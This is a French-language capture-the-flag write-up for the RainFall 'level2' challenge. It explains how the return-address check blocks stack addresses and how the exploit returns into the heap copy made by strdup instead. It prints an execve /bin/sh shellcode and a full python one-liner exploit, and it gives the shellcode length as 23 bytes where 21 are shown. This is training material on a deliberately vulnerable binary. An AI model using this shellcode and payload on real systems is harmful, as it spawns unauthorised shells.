Encore un buffer overflow
particularite: 
0x080484fb <+39>:    and    $0xb0000000,%eax
0x08048500 <+44>:    cmp    $0xb0000000,%eax

cela verifie que l'adresse de retour ne commence pas
par: 0xb

Or: 0xb correspond aux adresses de la stack
ou de l'env

on ne peut donc pas faire un buffer overflow
classique.
Cependant, on voit cela a la fin de p()
0x08048538 <+100>:   call   0x80483e0 <strdup@plt>

Le programme alloue notre input sur la heap

On voit egalement cela:
level2@RainFall:~$ ltrace ./level2
__libc_start_main(0x804853f, 1, 0xbffff734, 0x8048550, 0x80485c0 <unfinished ...>
fflush(0xb7fd1a20)                                            = 0
gets(0xbffff63c, 0, 0, 0xb7e5ec73, 0x80482b5
)                 = 0xbffff63c
puts(""
)                                                      = 1
strdup("")                                                    = 0x0804a008
+++ exited (status 8) +++

Cela nous dit que le pointeur renvoye par
strdup pointe vers 0x0804a008

On peut donc donnee notre shellcode en entree
suivi de nimporte quel char pour faire overflow
et recuperer le tout a cette adresse,
qui ne commence pas par 0xb puisque elle 
est sur la heap


shellcode:
"\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"

offset: 80 bytes
shellcode: 23 bytes

input:
((python -c 'print("\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "\x90"*59 + "\x08\xa0\x04\x08")'); cat) | /home/user/level2/level2